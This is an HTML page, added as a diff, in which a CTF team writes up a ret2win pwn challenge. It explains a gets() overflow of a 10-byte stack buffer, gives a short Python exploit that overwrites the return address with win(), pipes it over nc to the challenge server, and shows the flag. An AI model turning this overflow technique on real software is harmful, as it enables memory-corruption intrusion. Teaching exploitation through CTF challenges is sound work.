@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Return to Win · ByteMe CTF 26 writeup · NXT_CTFS</title>
+<meta name="description" content="A classic gets() overflow into hello()'s 10-byte buffer. 18 bytes of padding reach the return address, which is pointed at win()." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=0e2bdd96" />
+<link rel="stylesheet" href="../css/pages.css?v=8dc67e7f" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <span>return-to-win</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Return to Win <span class="page-sub">ret2win with a 10-byte buffer</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-pwn">pwn</span>
+      <span>100 pts</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p><strong>Overview</strong></p>
+<p>Classic ret2win challenge. A 64-bit ELF binary uses <code>gets()</code> to read into a
+10-byte stack buffer, allowing us to overwrite the return address and
+redirect execution to a <code>win()</code> function that prints the flag.</p>
+<h2 id="analysis"><a class="wu-anchor" href="#analysis" aria-hidden="true">#</a>Analysis</h2>
+<p>The binary has three relevant functions:</p>
+<ul>
+<li><code>main()</code> at <code>0x4012f0</code> - calls <code>hello()</code></li>
+<li><code>hello()</code> at <code>0x4011f6</code> - prompts for a name, reads input with <code>gets()</code>
+into a 10-byte buffer, prints it back</li>
+<li><code>win()</code> at <code>0x40125e</code> - opens <code>flag.txt</code> and prints its contents</li>
+</ul>
+<p>The vulnerability is <code>gets()</code>, which performs no bounds checking. The buffer
+sits at <code>rbp - 0xa</code>, so we need 10 bytes to fill the buffer + 8 bytes to
+overwrite the saved RBP = <strong>18 bytes</strong> of padding before we reach the return
+address.</p>
+<h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
+<figure class="wu-code" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> struct, sys</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">18</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">win_addr = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x40125e</span>)</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">sys.stdout.buffer.write(padding + win_addr + <span class="hljs-string">b&#x27;\n&#x27;</span>)</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">bash</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">python3 exploit.py | nc <span class="hljs-number">145.239</span><span class="hljs-number">.142</span><span class="hljs-number">.129</span> <span class="hljs-number">1340</span></span></span></code></pre>
+      
+    </figure><h2 id="output"><a class="wu-anchor" href="#output" aria-hidden="true">#</a>Output</h2>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">Hi, what's your name?
+Hello, AAAAAAAAAAAAAAAAAA^@!
+OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}</code></pre>
+      
+    </figure>
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#analysis">Analysis</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#output">Output</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="souls-weakness.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Soul's Weakness</span></a>
+    <a class="wu-pager-link wu-pager-next" href="red-skulls-trail.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Red Skull's Trail</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=4dd8bec6"></script>
+</body>
+</html>
